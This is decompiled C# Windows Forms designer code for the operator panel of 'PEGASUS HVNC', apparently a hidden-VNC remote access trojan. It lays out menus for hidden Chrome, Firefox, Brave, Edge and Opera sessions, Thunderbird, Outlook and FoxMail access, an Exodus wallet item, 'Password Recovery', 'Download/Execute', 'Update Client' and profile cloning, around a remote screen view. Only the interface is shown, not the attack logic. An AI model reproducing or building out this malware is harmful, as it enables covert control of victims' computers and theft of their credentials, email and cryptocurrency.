			guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
			guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
			guna2ContextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
			guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			guna2ContextMenuStrip1.ShowImageMargin = false;
			guna2ContextMenuStrip1.Size = new System.Drawing.Size(216, 124);
			test1ToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			test1ToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			test1ToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("test1ToolStripMenuItem.Image");
			test1ToolStripMenuItem.Name = "test1ToolStripMenuItem";
			test1ToolStripMenuItem.Size = new System.Drawing.Size(215, 24);
			test1ToolStripMenuItem.Text = "  Hidden Chrome          ";
			test1ToolStripMenuItem.Click += new System.EventHandler(test1ToolStripMenuItem_Click);
			test2ToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			test2ToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			test2ToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("test2ToolStripMenuItem.Image");
			test2ToolStripMenuItem.Name = "test2ToolStripMenuItem";
			test2ToolStripMenuItem.Size = new System.Drawing.Size(215, 24);
			test2ToolStripMenuItem.Text = "  Hidden FireFox";
			test2ToolStripMenuItem.Click += new System.EventHandler(test2ToolStripMenuItem_Click);
			braveToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			braveToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			braveToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("braveToolStripMenuItem.Image");
			braveToolStripMenuItem.Name = "braveToolStripMenuItem";
			braveToolStripMenuItem.Size = new System.Drawing.Size(215, 24);
			braveToolStripMenuItem.Text = "  Hidden Brave";
			braveToolStripMenuItem.Click += new System.EventHandler(braveToolStripMenuItem_Click);
			edgeToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			edgeToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			edgeToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("edgeToolStripMenuItem.Image");
			edgeToolStripMenuItem.Name = "edgeToolStripMenuItem";
			edgeToolStripMenuItem.Size = new System.Drawing.Size(215, 24);
			edgeToolStripMenuItem.Text = "  Hidden Edge";
			edgeToolStripMenuItem.Click += new System.EventHandler(edgeToolStripMenuItem_Click);
			operaGXToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			operaGXToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			operaGXToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("operaGXToolStripMenuItem.Image");
			operaGXToolStripMenuItem.Name = "operaGXToolStripMenuItem";
			operaGXToolStripMenuItem.Size = new System.Drawing.Size(215, 24);
			operaGXToolStripMenuItem.Text = "  Hidden Opera";
			operaGXToolStripMenuItem.Click += new System.EventHandler(operaGXToolStripMenuItem_Click);
			guna2ContextMenuStrip3.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2ContextMenuStrip3.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			guna2ContextMenuStrip3.ImageScalingSize = new System.Drawing.Size(25, 25);
			guna2ContextMenuStrip3.Items.AddRange(new System.Windows.Forms.ToolStripItem[8] { thunderbirdToolStripMenuItem, outlookToolStripMenuItem, foxMailToolStripMenuItem, walletsToolStripMenuItem, passwordRecoveryToolStripMenuItem, updateClientToolStripMenuItem, downloadExecuteToolStripMenuItem, autoScaleToolStripMenuItem });
			guna2ContextMenuStrip3.Name = "guna2ContextMenuStrip3";
			guna2ContextMenuStrip3.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2ContextMenuStrip3.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2ContextMenuStrip3.RenderStyle.ColorTable = null;
			guna2ContextMenuStrip3.RenderStyle.RoundedEdges = true;
			guna2ContextMenuStrip3.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
			guna2ContextMenuStrip3.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2ContextMenuStrip3.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
			guna2ContextMenuStrip3.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
			guna2ContextMenuStrip3.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			guna2ContextMenuStrip3.ShowImageMargin = false;
			guna2ContextMenuStrip3.Size = new System.Drawing.Size(214, 196);
			thunderbirdToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			thunderbirdToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			thunderbirdToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("thunderbirdToolStripMenuItem.Image");
			thunderbirdToolStripMenuItem.Name = "thunderbirdToolStripMenuItem";
			thunderbirdToolStripMenuItem.Size = new System.Drawing.Size(213, 24);
			thunderbirdToolStripMenuItem.Text = "   Thunderbird               ";
			thunderbirdToolStripMenuItem.Click += new System.EventHandler(thunderbirdToolStripMenuItem_Click);
			outlookToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			outlookToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			outlookToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("outlookToolStripMenuItem.Image");
			outlookToolStripMenuItem.Name = "outlookToolStripMenuItem";
			outlookToolStripMenuItem.Size = new System.Drawing.Size(213, 24);
			outlookToolStripMenuItem.Text = "   Outlook";
			outlookToolStripMenuItem.Click += new System.EventHandler(outlookToolStripMenuItem_Click);
			foxMailToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			foxMailToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			foxMailToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("foxMailToolStripMenuItem.Image");
			foxMailToolStripMenuItem.Name = "foxMailToolStripMenuItem";
			foxMailToolStripMenuItem.Size = new System.Drawing.Size(213, 24);
			foxMailToolStripMenuItem.Text = "   FoxMail";
			foxMailToolStripMenuItem.Click += new System.EventHandler(foxMailToolStripMenuItem_Click);
			walletsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[1] { exodosToolStripMenuItem });
			walletsToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			walletsToolStripMenuItem.Name = "walletsToolStripMenuItem";
			walletsToolStripMenuItem.Size = new System.Drawing.Size(213, 24);
			walletsToolStripMenuItem.Text = "   Wallets";
			walletsToolStripMenuItem.Visible = false;
			exodosToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			exodosToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			exodosToolStripMenuItem.Name = "exodosToolStripMenuItem";
			exodosToolStripMenuItem.Size = new System.Drawing.Size(144, 24);
			exodosToolStripMenuItem.Text = "   Exodos";
			exodosToolStripMenuItem.Click += new System.EventHandler(exodosToolStripMenuItem_Click);
			passwordRecoveryToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			passwordRecoveryToolStripMenuItem.Name = "passwordRecoveryToolStripMenuItem";
			passwordRecoveryToolStripMenuItem.Size = new System.Drawing.Size(213, 24);
			passwordRecoveryToolStripMenuItem.Text = "   Password Recovery";
			passwordRecoveryToolStripMenuItem.Visible = false;
			passwordRecoveryToolStripMenuItem.Click += new System.EventHandler(passwordRecoveryToolStripMenuItem_Click);
			updateClientToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			updateClientToolStripMenuItem.Name = "updateClientToolStripMenuItem";
			updateClientToolStripMenuItem.Size = new System.Drawing.Size(213, 24);
			updateClientToolStripMenuItem.Text = "   Update Client";
			updateClientToolStripMenuItem.Visible = false;
			updateClientToolStripMenuItem.Click += new System.EventHandler(updateClientToolStripMenuItem_Click);
			downloadExecuteToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			downloadExecuteToolStripMenuItem.Name = "downloadExecuteToolStripMenuItem";
			downloadExecuteToolStripMenuItem.Size = new System.Drawing.Size(213, 24);
			downloadExecuteToolStripMenuItem.Text = "   Download/Execute";
			downloadExecuteToolStripMenuItem.Visible = false;
			downloadExecuteToolStripMenuItem.Click += new System.EventHandler(downloadExecuteToolStripMenuItem_Click);
			autoScaleToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			autoScaleToolStripMenuItem.Name = "autoScaleToolStripMenuItem";
			autoScaleToolStripMenuItem.Size = new System.Drawing.Size(213, 24);
			autoScaleToolStripMenuItem.Text = "   ResetScale";
			autoScaleToolStripMenuItem.Visible = false;
			autoScaleToolStripMenuItem.Click += new System.EventHandler(autoScaleToolStripMenuItem_Click);
			panel1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			panel1.Controls.Add(guna2ControlBox2);
			panel1.Controls.Add(guna2ControlBox1);
			panel1.Controls.Add(btnClose);
			panel1.Controls.Add(btnSystem);
			panel1.Controls.Add(QualityScroll);
			panel1.Controls.Add(QualityLabel);
			panel1.Controls.Add(btnDisconnect);
			panel1.Controls.Add(ResizeScroll);
			panel1.Controls.Add(label1);
			panel1.Controls.Add(chkClone1);
			panel1.Controls.Add(btnBrowsers);
			panel1.Controls.Add(chkClone);
			panel1.Controls.Add(btnApps);
			panel1.Controls.Add(ClientRecoveryLabel);
			panel1.Controls.Add(pictureBox1);
			panel1.Dock = System.Windows.Forms.DockStyle.Top;
			panel1.Location = new System.Drawing.Point(0, 0);
			panel1.Name = "panel1";
			panel1.Size = new System.Drawing.Size(1154, 38);
			panel1.TabIndex = 33;
			panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(panel1_MouseDown);
			guna2ControlBox2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox2.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2ControlBox2.BackgroundImage");
			guna2ControlBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			guna2ControlBox2.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
			guna2ControlBox2.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.HoverState.Parent = guna2ControlBox2;
			guna2ControlBox2.IconColor = System.Drawing.Color.White;
			guna2ControlBox2.Location = new System.Drawing.Point(1014, 4);
			guna2ControlBox2.Name = "guna2ControlBox2";
			guna2ControlBox2.ShadowDecoration.Parent = guna2ControlBox2;
			guna2ControlBox2.ShowIcon = false;
			guna2ControlBox2.Size = new System.Drawing.Size(45, 29);
			guna2ControlBox2.TabIndex = 154;
			guna2ControlBox2.UseTransparentBackground = true;
			guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox1.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox1.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2ControlBox1.BackgroundImage");
			guna2ControlBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			guna2ControlBox1.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MaximizeBox;
			guna2ControlBox1.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox1.HoverState.Parent = guna2ControlBox1;
			guna2ControlBox1.IconColor = System.Drawing.Color.White;
			guna2ControlBox1.Location = new System.Drawing.Point(1059, 4);
			guna2ControlBox1.Name = "guna2ControlBox1";
			guna2ControlBox1.ShadowDecoration.Parent = guna2ControlBox1;
			guna2ControlBox1.ShowIcon = false;
			guna2ControlBox1.Size = new System.Drawing.Size(45, 29);
			guna2ControlBox1.TabIndex = 153;
			guna2ControlBox1.UseTransparentBackground = true;
			btnClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnClose.BackColor = System.Drawing.Color.Transparent;
			btnClose.BackgroundImage = (System.Drawing.Image)resources.GetObject("btnClose.BackgroundImage");
			btnClose.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			btnClose.FillColor = System.Drawing.Color.Transparent;
			btnClose.ImageRotate = 0f;
			btnClose.Location = new System.Drawing.Point(1104, 4);
			btnClose.Name = "btnClose";
			btnClose.ShadowDecoration.Parent = btnClose;
			btnClose.Size = new System.Drawing.Size(45, 29);
			btnClose.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			btnClose.TabIndex = 152;
			btnClose.TabStop = false;
			btnClose.UseTransparentBackground = true;
			btnClose.Click += new System.EventHandler(btnClose_Click);
			btnSystem.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnSystem.Animated = true;
			btnSystem.BackColor = System.Drawing.Color.Transparent;
			btnSystem.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			btnSystem.BorderRadius = 2;
			btnSystem.BorderThickness = 2;
			btnSystem.CheckedState.Parent = btnSystem;
			btnSystem.CustomImages.Parent = btnSystem;
			btnSystem.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnSystem.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnSystem.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnSystem.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnSystem.DisabledState.Parent = btnSystem;
			btnSystem.FillColor = System.Drawing.Color.Transparent;
			btnSystem.Font = new System.Drawing.Font("Electrolize", 9f);
			btnSystem.ForeColor = System.Drawing.Color.White;
			btnSystem.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnSystem.HoverState.Parent = btnSystem;
			btnSystem.ImageSize = new System.Drawing.Size(30, 30);
			btnSystem.Location = new System.Drawing.Point(720, 10);
			btnSystem.Name = "btnSystem";
			btnSystem.PressedColor = System.Drawing.Color.FromArgb(191, 38, 33);
			btnSystem.ShadowDecoration.Parent = btnSystem;
			btnSystem.Size = new System.Drawing.Size(94, 23);
			btnSystem.TabIndex = 45;
			btnSystem.Text = "System Control";
			btnSystem.Click += new System.EventHandler(btnSystem_Click);
			QualityScroll.FillColor = System.Drawing.Color.White;
			QualityScroll.HoverState.Parent = QualityScroll;
			QualityScroll.Location = new System.Drawing.Point(428, 4);
			QualityScroll.Name = "QualityScroll";
			QualityScroll.Size = new System.Drawing.Size(83, 13);
			QualityScroll.Style = Guna.UI2.WinForms.Enums.TrackBarStyle.Metro;
			QualityScroll.TabIndex = 151;
			QualityScroll.ThumbColor = System.Drawing.Color.FromArgb(191, 38, 33);
			QualityScroll.Value = 70;
			QualityScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(QualityScroll_Scroll);
			QualityLabel.AutoSize = true;
			QualityLabel.ForeColor = System.Drawing.Color.LightGray;
			QualityLabel.Location = new System.Drawing.Point(327, 4);
			QualityLabel.Name = "QualityLabel";
			QualityLabel.Size = new System.Drawing.Size(49, 13);
			QualityLabel.TabIndex = 150;
			QualityLabel.Text = "HQ: 99%";
			btnDisconnect.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnDisconnect.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			btnDisconnect.BorderRadius = 2;
			btnDisconnect.BorderThickness = 2;
			btnDisconnect.CheckedState.Parent = btnDisconnect;
			btnDisconnect.CustomImages.Parent = btnDisconnect;
			btnDisconnect.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnDisconnect.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnDisconnect.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnDisconnect.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnDisconnect.DisabledState.Parent = btnDisconnect;
			btnDisconnect.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnDisconnect.Font = new System.Drawing.Font("Electrolize", 9f);
			btnDisconnect.ForeColor = System.Drawing.Color.White;
			btnDisconnect.HoverState.Parent = btnDisconnect;
			btnDisconnect.ImageSize = new System.Drawing.Size(30, 30);
			btnDisconnect.Location = new System.Drawing.Point(908, 10);
			btnDisconnect.Name = "btnDisconnect";
			btnDisconnect.PressedColor = System.Drawing.Color.FromArgb(191, 38, 33);
			btnDisconnect.ShadowDecoration.Parent = btnDisconnect;
			btnDisconnect.Size = new System.Drawing.Size(94, 23);
			btnDisconnect.TabIndex = 39;
			btnDisconnect.Text = "Disconnect";
			btnDisconnect.Click += new System.EventHandler(btnDisconnect_Click);
			ResizeScroll.BackColor = System.Drawing.Color.Transparent;
			ResizeScroll.FillColor = System.Drawing.Color.White;
			ResizeScroll.HoverState.Parent = ResizeScroll;
			ResizeScroll.Location = new System.Drawing.Point(428, 20);
			ResizeScroll.Name = "ResizeScroll";
			ResizeScroll.Size = new System.Drawing.Size(83, 13);
			ResizeScroll.Style = Guna.UI2.WinForms.Enums.TrackBarStyle.Metro;
			ResizeScroll.TabIndex = 8;
			ResizeScroll.ThumbColor = System.Drawing.Color.FromArgb(191, 38, 33);
			ResizeScroll.Value = 70;
			ResizeScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(ResizeScroll_Scroll);
			label1.AutoSize = true;
			label1.ForeColor = System.Drawing.Color.Gainsboro;
			label1.Location = new System.Drawing.Point(546, 12);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(66, 13);
			label1.TabIndex = 4;
			label1.Text = "Clone Profile";
			chkClone1.AutoSize = true;
			chkClone1.ForeColor = System.Drawing.Color.Gainsboro;
			chkClone1.Location = new System.Drawing.Point(327, 20);
			chkClone1.Name = "chkClone1";
			chkClone1.Size = new System.Drawing.Size(56, 13);
			chkClone1.TabIndex = 4;
			chkClone1.Text = "Size : 75%";
			btnBrowsers.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnBrowsers.Animated = true;
			btnBrowsers.BackColor = System.Drawing.Color.Transparent;
			btnBrowsers.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			btnBrowsers.BorderRadius = 2;
			btnBrowsers.BorderThickness = 2;
			btnBrowsers.CheckedState.Parent = btnBrowsers;
			btnBrowsers.CustomImages.Parent = btnBrowsers;
			btnBrowsers.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnBrowsers.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnBrowsers.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnBrowsers.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnBrowsers.DisabledState.Parent = btnBrowsers;
			btnBrowsers.FillColor = System.Drawing.Color.Transparent;
			btnBrowsers.Font = new System.Drawing.Font("Electrolize", 9f);
			btnBrowsers.ForeColor = System.Drawing.Color.White;
			btnBrowsers.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnBrowsers.HoverState.Parent = btnBrowsers;
			btnBrowsers.ImageSize = new System.Drawing.Size(30, 30);
			btnBrowsers.Location = new System.Drawing.Point(626, 10);
			btnBrowsers.Name = "btnBrowsers";
			btnBrowsers.PressedColor = System.Drawing.Color.FromArgb(191, 38, 33);
			btnBrowsers.ShadowDecoration.Color = System.Drawing.Color.FromArgb(191, 38, 33);
			btnBrowsers.ShadowDecoration.Parent = btnBrowsers;
			btnBrowsers.Size = new System.Drawing.Size(94, 23);
			btnBrowsers.TabIndex = 148;
			btnBrowsers.Text = "Browsers";
			btnBrowsers.Click += new System.EventHandler(btnBrowsers_Click);
			chkClone.CheckedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			chkClone.CheckedState.BorderRadius = 2;
			chkClone.CheckedState.BorderThickness = 0;
			chkClone.CheckedState.FillColor = System.Drawing.Color.FromArgb(191, 38, 33);
			chkClone.CheckedState.Parent = chkClone;
			chkClone.ForeColor = System.Drawing.Color.Gainsboro;
			chkClone.Location = new System.Drawing.Point(522, 7);
			chkClone.Name = "chkClone";
			chkClone.ShadowDecoration.Parent = chkClone;
			chkClone.Size = new System.Drawing.Size(23, 23);
			chkClone.TabIndex = 4;
			chkClone.Text = "guna2CustomCheckBox1";
			chkClone.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			chkClone.UncheckedState.BorderRadius = 2;
			chkClone.UncheckedState.BorderThickness = 2;
			chkClone.UncheckedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			chkClone.UncheckedState.Parent = chkClone;
			btnApps.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnApps.Animated = true;
			btnApps.BackColor = System.Drawing.Color.Transparent;
			btnApps.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			btnApps.BorderRadius = 2;
			btnApps.BorderThickness = 2;
			btnApps.CheckedState.Parent = btnApps;
			btnApps.CustomImages.Parent = btnApps;
			btnApps.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnApps.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnApps.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnApps.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnApps.DisabledState.Parent = btnApps;
			btnApps.FillColor = System.Drawing.Color.Transparent;
			btnApps.Font = new System.Drawing.Font("Electrolize", 9f);
			btnApps.ForeColor = System.Drawing.Color.White;
			btnApps.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnApps.HoverState.Parent = btnApps;
			btnApps.ImageSize = new System.Drawing.Size(30, 30);
			btnApps.Location = new System.Drawing.Point(814, 10);
			btnApps.Margin = new System.Windows.Forms.Padding(0);
			btnApps.Name = "btnApps";
			btnApps.PressedColor = System.Drawing.Color.FromArgb(191, 38, 33);
			btnApps.ShadowDecoration.Parent = btnApps;
			btnApps.Size = new System.Drawing.Size(94, 23);
			btnApps.TabIndex = 149;
			btnApps.Text = "Applications";
			btnApps.Click += new System.EventHandler(btnApps_Click);
			ClientRecoveryLabel.AutoSize = true;
			ClientRecoveryLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			ClientRecoveryLabel.ForeColor = System.Drawing.Color.Gainsboro;
			ClientRecoveryLabel.Location = new System.Drawing.Point(39, 14);
			ClientRecoveryLabel.Name = "ClientRecoveryLabel";
			ClientRecoveryLabel.Size = new System.Drawing.Size(100, 15);
			ClientRecoveryLabel.TabIndex = 1;
			ClientRecoveryLabel.Text = "PEGASUS HVNC";
			pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			pictureBox1.Location = new System.Drawing.Point(4, 6);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(31, 28);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			pictureBox1.TabIndex = 145;
			pictureBox1.TabStop = false;
			panel3.BackColor = System.Drawing.Color.FromArgb(191, 38, 33);
			panel3.Dock = System.Windows.Forms.DockStyle.Top;
			panel3.Location = new System.Drawing.Point(0, 38);
			panel3.Name = "panel3";
			panel3.Size = new System.Drawing.Size(1154, 41);
			panel3.TabIndex = 37;
			panel3.Visible = false;
			panel3.MouseDown += new System.Windows.Forms.MouseEventHandler(panel1_MouseDown);
			panel4.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			panel4.Controls.Add(IntervalScroll);
			panel4.Controls.Add(IntervalLabel);
			panel4.Controls.Add(CloseBtn);
			panel4.Controls.Add(RestoreMaxBtn);
			panel4.Controls.Add(MinBtn);
			panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
			panel4.Location = new System.Drawing.Point(0, 575);
			panel4.Name = "panel4";
			panel4.Size = new System.Drawing.Size(1154, 35);
			panel4.TabIndex = 40;
			panel4.MouseDown += new System.Windows.Forms.MouseEventHandler(panel1_MouseDown);
			IntervalScroll.HoverState.Parent = IntervalScroll;
			IntervalScroll.Location = new System.Drawing.Point(110, 2);
			IntervalScroll.Maximum = 1000;
			IntervalScroll.Name = "IntervalScroll";
			IntervalScroll.Size = new System.Drawing.Size(46, 26);
			IntervalScroll.TabIndex = 8;
			IntervalScroll.ThumbColor = System.Drawing.Color.FromArgb(191, 38, 33);
			IntervalScroll.Value = 500;
			IntervalScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(IntervalScroll_Scroll);
			IntervalLabel.AutoSize = true;
			IntervalLabel.ForeColor = System.Drawing.Color.Gainsboro;
			IntervalLabel.Location = new System.Drawing.Point(12, 9);
			IntervalLabel.Name = "IntervalLabel";
			IntervalLabel.Size = new System.Drawing.Size(88, 13);
			IntervalLabel.TabIndex = 6;
			IntervalLabel.Text = "Interval (ms): 500";
			CloseBtn.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			CloseBtn.BackColor = System.Drawing.Color.Transparent;
			CloseBtn.CheckedState.ImageSize = new System.Drawing.Size(64, 64);
			CloseBtn.CheckedState.Parent = CloseBtn;
			CloseBtn.HoverState.ImageSize = new System.Drawing.Size(31, 31);
			CloseBtn.HoverState.Parent = CloseBtn;
			CloseBtn.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.Image");
			CloseBtn.ImageOffset = new System.Drawing.Point(0, 0);
			CloseBtn.ImageRotate = 0f;
			CloseBtn.ImageSize = new System.Drawing.Size(30, 30);
			CloseBtn.Location = new System.Drawing.Point(1107, 0);
			CloseBtn.Name = "CloseBtn";
			CloseBtn.PressedState.ImageSize = new System.Drawing.Size(31, 31);
			CloseBtn.PressedState.Parent = CloseBtn;
			CloseBtn.ShadowDecoration.Parent = CloseBtn;
			CloseBtn.Size = new System.Drawing.Size(36, 30);
			CloseBtn.TabIndex = 41;
			CloseBtn.UseTransparentBackground = true;
			CloseBtn.Click += new System.EventHandler(CloseBtn_Click);
			RestoreMaxBtn.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			RestoreMaxBtn.BackColor = System.Drawing.Color.Transparent;
			RestoreMaxBtn.CheckedState.ImageSize = new System.Drawing.Size(64, 64);
			RestoreMaxBtn.CheckedState.Parent = RestoreMaxBtn;
			RestoreMaxBtn.HoverState.ImageSize = new System.Drawing.Size(31, 31);
			RestoreMaxBtn.HoverState.Parent = RestoreMaxBtn;
			RestoreMaxBtn.Image = (System.Drawing.Image)resources.GetObject("RestoreMaxBtn.Image");
			RestoreMaxBtn.ImageOffset = new System.Drawing.Point(0, 0);
			RestoreMaxBtn.ImageRotate = 0f;
			RestoreMaxBtn.ImageSize = new System.Drawing.Size(30, 30);
			RestoreMaxBtn.Location = new System.Drawing.Point(1071, 0);
			RestoreMaxBtn.Name = "RestoreMaxBtn";
			RestoreMaxBtn.PressedState.ImageSize = new System.Drawing.Size(31, 31);
			RestoreMaxBtn.PressedState.Parent = RestoreMaxBtn;
			RestoreMaxBtn.ShadowDecoration.Parent = RestoreMaxBtn;
			RestoreMaxBtn.Size = new System.Drawing.Size(36, 30);
			RestoreMaxBtn.TabIndex = 42;
			RestoreMaxBtn.UseTransparentBackground = true;
			RestoreMaxBtn.Click += new System.EventHandler(RestoreMaxBtn_Click);
			MinBtn.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			MinBtn.CheckedState.ImageSize = new System.Drawing.Size(64, 64);
			MinBtn.CheckedState.Parent = MinBtn;
			MinBtn.HoverState.ImageSize = new System.Drawing.Size(31, 31);
			MinBtn.HoverState.Parent = MinBtn;
			MinBtn.Image = (System.Drawing.Image)resources.GetObject("MinBtn.Image");
			MinBtn.ImageOffset = new System.Drawing.Point(0, 0);
			MinBtn.ImageRotate = 0f;
			MinBtn.ImageSize = new System.Drawing.Size(30, 30);
			MinBtn.Location = new System.Drawing.Point(1035, 0);
			MinBtn.Name = "MinBtn";
			MinBtn.PressedState.ImageSize = new System.Drawing.Size(31, 31);
			MinBtn.PressedState.Parent = MinBtn;
			MinBtn.ShadowDecoration.Parent = MinBtn;
			MinBtn.Size = new System.Drawing.Size(36, 30);
			MinBtn.TabIndex = 43;
			MinBtn.Click += new System.EventHandler(MinBtn_Click);
			VNCBox.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			VNCBox.BackgroundImage = (System.Drawing.Image)resources.GetObject("VNCBox.BackgroundImage");
			VNCBox.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			VNCBox.Dock = System.Windows.Forms.DockStyle.Fill;
			VNCBox.ErrorImage = null;
			VNCBox.InitialImage = null;
			VNCBox.Location = new System.Drawing.Point(0, 79);
			VNCBox.Name = "VNCBox";
			VNCBox.Size = new System.Drawing.Size(1154, 496);
			VNCBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			VNCBox.TabIndex = 41;
			VNCBox.TabStop = false;
			VNCBox.MouseDown += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseDown);
			VNCBox.MouseEnter += new System.EventHandler(VNCBox_MouseEnter);
